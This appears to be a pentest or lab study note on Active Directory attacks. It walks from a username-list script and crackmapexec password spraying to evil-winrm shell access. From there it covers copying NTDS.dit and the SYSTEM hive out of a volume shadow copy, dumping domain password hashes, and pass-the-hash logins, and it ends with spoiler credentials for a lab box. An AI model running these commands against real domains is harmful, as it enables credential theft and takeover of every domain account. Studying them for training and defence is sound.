## Goals

Dictionary attack by dumping hashes from NTDS.dit file

## Pre-requisites

foothold inside the network

## Explaination

Once a windows system has joined a domain it will no longer default to referencing the local SAM database to validate logon requests. The system will now validate all the authentication requests by the domain controller. Local accounts can still be accessed from the terminal by using the identifier as hostname/username, or directly from the logo UI by specifying `./` in the username field.

## Attacks
### Dictionary attacks on AD accounts using crackmapexec

**Strength**: Very noisy and easier to detect

Try to custom tailor the attack as much as possible. Gather information by passive recon and finding and creating a tailored directory. Using that try to find the naming convention pattern.
After creating a directory either manually generate a userlist or use automated tools like [Username_Anarchy](https://github.com/urbanadventurer/username-anarchy) to generate username list.

Use this script to generate the user-wordlist

```sh
#!/bin/bash
filename=$1
while IFS= read -r r; do
    username-anarchy/username-anarchy -i "$filename" -F "$r" 
done < "$2"
```

##### Basic Command

`./username-anarchy -i file.txt`

This will generate a list of usernames following a lot of naming conventions. Try reducing the rule list to reduce the number of requests made.

#### Launch attack

Use crackmapexec with the smb protocol to launch the attack against the domain controller.

**Risk**: If the admin configured an accounts lockout policy this attack can potentially lock the account up.

### Post-Exploitation

| **Command** | **Description** |
|--|--|
| `evil-winrm -i <target_ip>  -u <username> -p '<password>'` | Connects to a shell session of the target machine |
| *On the shell* |
| `net localgroup` | Displays local group memberships |
| `net user <username>` | Displays Domain privilages of the user |

To proceed further into the engagement we need `Administrator`(local group) or `Domain Admin`(domain permission) we can use this to obtain the `ntds.dit file`.

AD uses NT Directory Services to find and organize network resources. The `NTDS.dit` file is located in `%systemroot$/ntds` on the domain controlled in a forest. This is the primary database file associated by AD and stores all domain usernames, password hashes and other critical schema information.

> ***Importance*** This file could potentially compromise every account on the domain.

#### Create shadow copy of AD drive

Use `vssadmin` to create a volume shadow copy(`VSS`) of the drive where AD is installed. Commonly `ntds.dit` is stored in the C: volume but the location may vary.

Use `reg.exe` to obtain the hklm\system file.

| **Command** | **Description** |
|--|--|
| `vssadmin CREATE SHADOW /For=<volume_letter>:` | Creates a shadow copy |
| `PS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit <dest_path>` | extracts ntds.dit file from the vss to the destination path |
| `reg.exe save hklm\system C:\system.save` | Saves the hklm\system file

Transfer the file using file transfer methods

use [goseceretdump](https://github.com/c-sto/gosecretsdump) to dump the contents of the ntds file.

> **Tip** We can use `crackmapexec smb -u <username/list> -p <password/list> --ntds` to utilise vss and quickly captures the ntds.dit file. This returns a plaintext file that can be used directly.

After obtaining the hashes from the ntds.dit file we can either crack the hashes or we can try the `Pass-the-Hash` attack to authenticate the use without using a cleartext password and using the NT hash that we obtain from the file .

`evil-winrm -i <target_ip>  -u <username> -H '<NT_hash>`

#### Remediation

Check the event logs using event viewer to see what tracks were left from the attack, and view what activities were performed post-exploitation

>! **Spoilers** Credentials for the tut box jmarston:P@ssword!